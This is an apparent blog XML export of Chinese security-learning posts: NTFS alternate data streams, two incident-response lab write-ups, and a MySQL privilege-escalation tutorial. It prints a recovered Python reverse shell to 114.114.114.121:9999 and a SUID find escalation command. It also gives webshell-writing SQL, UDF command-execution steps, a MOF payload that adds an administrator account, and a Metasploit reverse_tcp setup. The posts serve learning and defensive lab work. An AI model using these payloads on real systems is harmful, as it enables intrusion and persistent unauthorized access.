<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NTFS数据流隐写</title>
      <link href="/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
      <url>/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。</p><h1><span id="ntfs数据流介绍">NTFS数据流介绍</span></h1><p>在NTFS文件系统中存在着NTFS备用数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS备用数据流。</p><p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p><p>ADS也被用于一些恶意文件隐藏自身,作为后门。</p><h1><span id="ads应用">ADS应用</span></h1><p>这里写一个隐藏文本来看看，首先创建一个空的example.txt，然后写入ADS，这里写入一个字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#这里要用cmd，用powershell会报错</span><br></code></pre></td></tr></table></figure><p>然后直接打开文件还是空的</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>想要查看ADS的话可以这样</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>还有用下面命令查看该文件所有的ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADS可以写任何东西，包括图片、音频、视频等，所以可以用来隐藏后门，在Windows XP中，可执行文件可以隐藏并且被执行。但是，微软已经发现了这个问题并进行了修复，目前在Windows Vista及后续系统中已经无法直接运行ADS中的可执行文件了。</p><p>可以直接这样写入文件，其他文件同理</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADS数据流文件有三种删除方式。一是直接<strong>删除宿主</strong>文件，二是将宿主文件<strong>移到</strong>FAT32<strong>等非</strong>NTFS<strong>分区中</strong>；三是利用<strong>工具软件</strong>，如IceSword、Ntfs Streams Editor删除。</p><p>Ntfs Streams Editor删除命令如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机应急响应靶场-第三章</title>
      <link href="/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
      <url>/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="linux权限维持">Linux权限维持</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc<br>1.黑客隐藏的隐藏的文件 完整路径md5<br>2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;<br>3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; <br>4.黑客尝试注入恶意代码的工具完整路径md5<br>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>这里看了一下web目录没什么东西，直接用D盾全盘查杀一下</p><blockquote><p>这里挂载要指定端口，指定端口的形式是这样的：\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmm但是卡住了扫不出来东西</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>最后是在&#x2F;tmp目录下发现了一个隐藏文件，里面有python脚本&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>其脚本内容</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>其反弹shell的ip和端口就是上面代码中的</p><p>flag{114.114.114.121:9999}</p><blockquote><p>一开始找到一个1.sh的脚本，里面是一个bash反弹shell但是那个玩意不是flag，不知道是不是环境没怎么改。。。</p></blockquote><p>查看黑客的提权命令，先看&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>有个ctf用户，切换到该用户执行下面命令找是否能够suid提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>发现find命令就能提权</p><p>其提权命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmm没想明白这个思路是怎么来的，看别人的wp，难道提权一定是suid吗😥</p></blockquote><p>然后就是找注入代码的恶意工具，这里用下面这个命令查找</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>搜索可以知道这是一个注入工具：<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoa是一款隐秘的后门工具，通过向目标主机上活跃的进程注入恶意代码来执行后门工作，这也反向说明了，实际上Cymothoa后门会拥有和原进程相同的权限，且Cymothoa是通过向系统进程注入shellcode去执行后门，所以不会像以前写过的许多后门一样创建自己的进程，这使得它的隐蔽性提高了很多。</p></blockquote><p>所以其工具路径如下：&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>最后执行一下这个1.py的脚本查询一下网络连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>然后找到一个软链接，这个就是flag(没懂跟题目描述的步骤有什么关系</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>说实话是在没看懂这里是什么意思，看的别人的wp，有点意义不明。。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql提权</title>
      <link href="/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2024/07/12/mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1><span id="权限获取">权限获取</span></h1><p>要提权之前首先就要拿到mysql的权限，这里大佬的文章已经说的很详细了，我就记录一些写shell相关的知识</p><p><strong>into outfile写shell</strong></p><p>需要load_file () 开启 即 secure_file_priv 无限制</p><p>可以通过下面命令查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>&#x2F;tmp</td><td>只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p><strong>日志写shell</strong></p><p>可以下面命令查看日志位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>我们可以自己修改日志文件位置，这样就可以写shell进去了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1><span id="udf提权">udf提权</span></h1><p>自定义函数(user defined function)，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p><h2><span id="手工复现">手工复现</span></h2><p><strong>动态链接库</strong></p><p>自定义函数是是使用动态链接库的形式实现的，如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>动态链接库的文件可以去sqlmap和metasploit工具里面去找</p><p><strong>sqlmap的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>里面有windows和Linux的32位和64位的动态链接库</p><p>不过sqlmap里的动态链接库为了防止误杀经过编码处理不能直接使用，不过可以利用sqlmap自带的解码工具来进行解码使用，工具在&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploit的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSF根目录/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msf自带的动态链接库不需要解码可以直接使用</p><blockquote><p>kali里面msf的根目录在&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>下一步就是将链接库放到插件目录下</strong></p><p>可以用下面命令查找插件目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#这样也行</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>如果不存在的话可以找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹</p><p>找mysql的安装目录可以用这个命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>写入动态链接库</strong></p><p>sql注入是post注入可以直接写，因为get有长度限制，这里可以用sqlmap来写</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;url地址&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>也可以直接手工用sql语句写进去，这些前提都是有写权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接 SELECT 查询十六进制写入</span><br>SELECT 0x7f454c4602... INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>十六进制的获取可以直接本地用mysql的hex函数编码一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接传入路径编码</span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># 也可以将路径 hex 编码</span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>然后就是创建自定义函数并调用命令</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#查看是否新增了sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#然后就可以执行系统命令了<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#删除自定义函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>如果想看so文件里面有哪些函数，可以拖进ida里面看一看</p></blockquote><h1><span id="mof提权">mof提权</span></h1><p>这是一个比较老的漏洞了，基本上在 Windows Server 2003 的环境下才可以成功。</p><p>提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><p><strong>mof脚本的内容</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>核心payload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#这两段指令分别是使用net.exe工具添加一个名为<span class="hljs-string">&quot;hacker&quot;</span>的新用户，密码设置为<span class="hljs-string">&quot;P@ssw0rd&quot;</span>。/add参数表示添加一个新用户<br>#将用户<span class="hljs-string">&quot;hacker&quot;</span>添加到本地管理员组（localgroup administrators）。这意味着<span class="hljs-string">&quot;hacker&quot;</span>用户将拥有管理员权限。<br></code></pre></td></tr></table></figure><p>依然可以用上面的方法把文件变成十六进制写入</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下</p><p><strong>痕迹清理</strong></p><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><br><span class="hljs-comment"># 删除 Repository 文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /delete<br><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msf提权</strong></p><p>msf里面就有mof提权的模块，还会自动清理痕迹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># 设置好自己的 payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># 设置目标 MySQL 的基础信息</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机应急响应靶场-第二章</title>
      <link href="/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
      <url>/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="apache日志分析">Apache日志分析</span></h1><p>靶场简介：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号密码 root apacherizhi<br>ssh root@IP<br>1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:<br></code></pre></td></tr></table></figure><p>apache的日志放在&#x2F;var&#x2F;log&#x2F;apache目录下面</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>然后用下面指令筛选出访问的ip次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>命令用于剪切并分割文件中的行。<br>-d-指定分隔符为<span class="hljs-string">&quot;-&quot;</span>，即以连字符作为字段的分隔符。<br>-f 1指定只提取每个字段的第一个部分，也就是行的第一个元素。<br><br><span class="hljs-built_in">sort</span>命令用于对文本行进行排序。<br>-r选项表示以逆序（从大到小）排序。<br>-n选项表示按照数值大小进行排序。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>浏览器指纹就过滤一下看看具体的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//浏览器指纹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> 找index.php页面被访问的次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -l命令用于计算匹配到的行数，flag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>查找黑客ip访问的次数，我们只要把去掉重复行改成计算匹配行数即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>查看2023年8月03日8时这一个小时内有多少IP访问，把第一个查看访问ip改成时间即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># 我们要用ip来匹配才能正确去掉重复行，所以要先awk打印第一个字段也就是ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1><span id="mysql应急响应">mysql应急响应</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysql应急响应 ssh账号 root  密码 xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.黑客第一次写入的shell flag&#123;关键字符串&#125; <br>2.黑客反弹shell的ip flag&#123;ip&#125;<br>3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx<br>4.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure><p>先去看一下mysql的日志，在&#x2F;var&#x2F;log&#x2F;mysql下面</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>看看web目录下有没有被写shell，毕竟一般都是从网站开始渗透的</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" alt="image-20240711183039409"></p><p>果然有，flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>也可以直接使用河马查杀，刚学到的，下载也很快，这是官网：<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>用法也很简单</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载解压缩</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># 使用</span><br>./hm deepscan &lt;要扫描的目录&gt; <span class="hljs-comment"># 